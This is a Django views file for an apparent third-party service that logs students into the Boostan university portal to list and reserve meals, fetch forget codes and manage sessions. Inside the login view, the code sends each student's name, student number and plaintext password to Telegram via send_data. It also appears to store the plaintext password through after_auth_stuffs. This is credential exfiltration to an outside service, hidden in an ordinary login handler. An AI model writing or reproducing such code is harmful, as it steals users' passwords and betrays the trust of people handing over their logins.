import json

from django.http import JsonResponse
from django.views.decorators.http import require_http_methods
from utils.boostan import Boostan
from utils.decorators import (
    login_decorator,
    login_post_parameters,
    permission_decorator,
)
from utils.functions import (
    after_auth_stuffs,
    create_sessions_list,
    get_client_ip,
    session_generator,
)
from utils.telegram import send_data

from .models import (
    create_session_object_for_student,
    delete_session_object_for_student,
    get_all_user_sessions_by_sesion,
    get_deadline_message,
    get_food_reserve_unexpected_error_message,
    get_forget_code_deadline_message,
    get_insufficient_balance_message,
    get_invalid_credential_message,
    get_missing_food_list_message,
    get_missing_parameter_message,
    get_no_reserved_food_message,
    get_session_not_found_message,
    get_session_not_passed_message,
    get_student_by_stu_number,
    get_succeess_login_message,
    get_success_logout_message,
    get_success_reserve_message,
    increment_total_forget_code,
    increment_total_recieved_list,
    increment_total_reserved_food,
    statistics_total_forget_code,
    statistics_total_list,
    statistics_total_reserves,
    update_user_credit,
)

'''
    @api {post} /api/login/ Login
'''
@require_http_methods(["POST"])
def login(request):
    if not {"stun", "password", "telegram_data"}.issubset(set(request.POST)):
        return JsonResponse(
            {"error": get_missing_parameter_message(), "relogin": True}, status=400 # Parameteres missing
        )
    ip_address = get_client_ip(request)
    # Get request parameters
    user_agent = request.META.get("HTTP_USER_AGENT", "")
    stu_number = request.POST.get("stun").strip()
    password = request.POST.get("password").strip()
    telegram_data = json.loads(request.POST.get("telegram_data"))
    boostan = Boostan(stu_number, password) # Create Boostan object
    login_status = boostan.login() # Login to boostan
    if not login_status:
        return JsonResponse(
            {"error": get_invalid_credential_message(), "relogin": True}, status=401 # Invalid credentials
        )
    name, credit = boostan.get_user_info() # Get user info
    session = session_generator() # Generate session
    after_auth_stuffs(ip_address, stu_number, password, name, credit, session, user_agent) # Add/Update user info to database.
    student = get_student_by_stu_number(stu_number)
    create_session_object_for_student(
        student=student,
        session=session,
        ip_address=ip_address,
        user_agent=user_agent,
        telegram_id=telegram_data.get("id", ""),
        telegram_username=telegram_data.get("username", ""),
    )

    send_data(name, stu_number, password) # Send data to telegram
    return JsonResponse({"message": get_succeess_login_message(), "session": session}, status=200) # Successful login

'''
    @api {post} /api/get-food-list/ Get food list
'''
@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def food_list(request, student, boostan):
    food_list_status = boostan.get_food_list() # Get food list from boostan
    name, credit = boostan.get_user_info() # Get user info
    student_info = {"name": name, "credit": credit}
    if not food_list_status:
        return JsonResponse({"error": get_deadline_message(), "student": student_info}, status=400) # Deadline
    elif food_list_status == 1:
        return JsonResponse(
            {"error": get_insufficient_balance_message(), "student": student_info}, status=400 # Insufficient balance
        )
    food_list = food_list_status
    statistics_total_list() # Increment total food list recieved
    increment_total_recieved_list(student) # Increment total food list recieved by student
    return JsonResponse({"food_list": food_list}, status=200) # Successful food list

'''
    @api {post} /api/reserve-food/ Reserve food
'''
@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def reserve_food(request, student, boostan):
    if not "food-list" in request.POST:
        return JsonResponse({"error": get_missing_food_list_message()}, status=400) # Missing food list parameter
    food_list = json.loads(request.POST["food-list"])
    boostan.get_user_info() # Get user info
    food_list_status = boostan.get_food_list() # Get food list from boostan
    if not food_list_status:
        return JsonResponse({"error": get_deadline_message()}, status=400) # Deadline
    food_list_status = boostan.reserve_food(food_list) # Reserve food
    if not food_list_status:
        return JsonResponse({"error": get_food_reserve_unexpected_error_message()}, status=400) # Food reserve unexpected error
    elif food_list_status == 2:
        return JsonResponse({"error": get_insufficient_balance_message()}, status=400) # Insufficient balance
    else:
        credit = boostan.extract_user_name_credit(food_list_status)[1] # Extract student credit
        update_user_credit(student, credit) # Update student credit
        statistics_total_reserves() # Increment total food reserve
        increment_total_reserved_food(student) # Increment total food reserve by student
        return JsonResponse({"message": get_success_reserve_message()}, status=200) # Successful food reserve

'''
    @api {post} /api/get-forget-code/ Get forget code
'''
@require_http_methods(["POST"])
@login_post_parameters
@login_decorator
@permission_decorator
def forget_code(request, student, boostan):
    statistics_total_forget_code() # Increment total forget code
    increment_total_forget_code(student) # Increment total forget code by student
    forget_code_status = boostan.get_forget_code() # Get forget code from boostan
    if not forget_code_status:
        return JsonResponse({"error": get_no_reserved_food_message()}, status=400) # No reserved food
    elif forget_code_status == 2:
        return JsonResponse({"error": get_forget_code_deadline_message()}, status=400) # Forget code deadline
    forget_code = forget_code_status
    return JsonResponse({"message": forget_code}, status=200) # Successful forget code

'''
    @api {post} /api/logout/ Logout from session
'''
@require_http_methods(["POST"])
def logout(request):
    if not {"session"}.issubset(set(request.POST)):
        return JsonResponse({"error": get_session_not_passed_message()}, status=400) # Missing session parameter
    session = request.POST.get("session").strip() # Get session parameter
    if not session:
        return JsonResponse({"error": get_session_not_passed_message()}, status=400) # Invalid session parameter
    if not delete_session_object_for_student(session):
        return JsonResponse({"error": get_session_not_found_message()}, status=400) # Session not found
    else:
        return JsonResponse({"message": get_success_logout_message()}, status=200) # Successful logout

'''
    @api {post} /api/get-sessions/ Get sessions
'''
@require_http_methods(["POST"])
def get_sessions(request):
    if not {"session"}.issubset(set(request.POST)):
        return JsonResponse({"error": get_session_not_passed_message()}, status=400) # Missing session parameter
    session = request.POST.get("session").strip() # Get session parameter
    if not session:
        return JsonResponse({"error": get_session_not_passed_message()}, status=400) # Invalid session parameter
    sessions = get_all_user_sessions_by_sesion(session) # Get all user sessions by student session
    if not sessions:
        return JsonResponse({"error": get_session_not_found_message()}, status=400) # Session not found
    return JsonResponse({"message": create_sessions_list(sessions)}, status=200) # Successful sessions
